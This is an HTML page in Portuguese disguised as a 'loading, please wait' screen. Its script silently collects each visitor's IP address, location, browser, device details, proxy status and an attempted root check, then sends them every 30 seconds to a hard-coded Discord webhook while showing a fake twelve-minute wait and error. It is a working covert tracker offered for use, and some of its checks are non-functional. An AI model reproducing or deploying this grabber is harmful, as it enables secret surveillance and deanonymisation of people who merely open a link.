<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .loading {
            font-size: 2em;
            margin-top: 20px;
            color: #ff6347;
        }

        .content {
            border: 2px solid white;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            width: 300px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
            border-radius: 10px;
        }

        .error {
            color: red;
            font-size: 2em;
            margin-top: 20px;
        }

        .status {
            color: #ff6347;
        }
    </style>
</head>
<body>
    <div class="content">
        <h1>Carregando...</h1>
        <p class="loading" id="loadingMessage">Por favor, aguarde...</p>
        <p id="statusMessage" class="status">Estamos processando...</p>
    </div>

    <script>
        // Função para pegar informações do dispositivo
        function getDeviceInfo() {
            const deviceInfo = navigator.userAgent;  // Informações do dispositivo
            const browser = getBrowser();  // Função para capturar o navegador corretamente
            const isMobile = /Mobi|Android/i.test(deviceInfo);
            const isPC = !isMobile;

            return { deviceInfo, browser, isMobile, isPC };
        }

        // Função para detectar o navegador corretamente
        function getBrowser() {
            let userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.indexOf("chrome") > -1) {
                return "Chrome";
            } else if (userAgent.indexOf("firefox") > -1) {
                return "Firefox";
            } else if (userAgent.indexOf("safari") > -1) {
                return "Safari";
            } else {
                return "Desconhecido";
            }
        }

        // Função para verificar se o dispositivo está rootado (mobile)
        function isRooted() {
            if (/android/i.test(navigator.userAgent)) {
                try {
                    // Tentativa de verificar arquivos típicos de root em Android
                    const fs = new ActiveXObject("Scripting.FileSystemObject");
                    return fs.FileExists("/system/app/Superuser.apk") || fs.FileExists("/system/xbin/su");
                } catch (e) {
                    return false;
                }
            }
            return false;
        }

        // Função para verificar se o usuário está usando VPN ou Proxy
        function detectVPNorProxy(ip) {
            return fetch(`https://ip-api.com/json/${ip}`)
                .then(response => response.json())
                .then(data => {
                    return data.proxy ? "Proxy Detectado" : "Sem Proxy/VPN Detectado";
                });
        }

        // Função para enviar as informações para o Discord Webhook
        function sendToDiscord(info) {
            const webhookUrl = 'https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3';
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `
**# Informações do Usuário:**

> **IP:** ${info.ip}
> **Dispositivo:** ${info.deviceInfo}
> **Navegador:** ${info.browser}
> **Modelo de Dispositivo:** ${info.model}
> **VPN/Proxy:** ${info.vpnOrProxy}
> **Root:** ${info.isRooted ? "Sim" : "Não"}
> **Tipo de Dispositivo:** ${info.isMobile ? "Mobile" : "PC"}
`)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Dados enviados com sucesso!');
                } else {
                    console.error('Erro ao enviar dados');
                }
            })
            .catch(error => console.error('Erro ao enviar dados:', error));
        }

        // Função para pegar o IP e a região do usuário
        function getUserIP() {
            return fetch('https://ip-api.com/json')
                .then(response => response.json())
                .then(data => {
                    return {
                        ip: data.query,  // IP do usuário
                        region: data.city + ', ' + data.country  // Região (cidade, país)
                    };
                });
        }

        // Função para pegar o modelo do dispositivo
        function getDeviceModel() {
            if (/Mobi|Android/i.test(navigator.userAgent)) {
                const model = navigator.userAgent.match(/(.*?)/);
                return model ? model[1] : "Desconhecido";
            }
            return "Desktop";
        }

        // Função para simular a espera de 12 minutos (720 segundos)
        function startLoading() {
            let elapsedTime = 0;
            const loadingMessage = document.getElementById('loadingMessage');
            const statusMessage = document.getElementById('statusMessage');

            const loadingInterval = setInterval(() => {
                elapsedTime += 10;  // Atualizar a cada 10 segundos

                // Enviar dados a cada 30 segundos
                if (elapsedTime % 30 === 0) {
                    getUserIP().then(userInfo => {
                        const deviceInfo = getDeviceInfo();
                        detectVPNorProxy(userInfo.ip).then(vpnStatus => {
                            sendToDiscord({
                                ...userInfo,
                                deviceInfo: deviceInfo.deviceInfo,
                                browser: deviceInfo.browser,
                                model: getDeviceModel(),
                                vpnOrProxy: vpnStatus,
                                isRooted: isRooted(),
                                isMobile: deviceInfo.isMobile
                            });
                        });
                    });
                }

                // Atualizar mensagem de carregamento
                loadingMessage.innerText = `Por favor, aguarde... (${elapsedTime / 60} min)`;

                // Após 12 minutos (720 segundos), gerar erro e parar o carregamento
                if (elapsedTime >= 720) {
                    clearInterval(loadingInterval);  // Parar o carregamento
                    showError();  // Mostrar erro
                }
            }, 10000);  // Intervalo de 10 segundos
        }

        // Função para mostrar mensagem de erro após 12 minutos
        function showError() {
            const statusMessage = document.getElementById('statusMessage');
            const loadingMessage = document.getElementById('loadingMessage');
            loadingMessage.innerText = "Ocorreu um erro durante o processamento.";
            statusMessage.innerText = "Falha ao carregar os dados!";
            document.body.style.backgroundColor = "red";  // Mudar fundo para vermelho
        }

        // Iniciar a tela de carregamento quando a página for carregada
        window.onload = startLoading;
    </script>
</body>
</html>
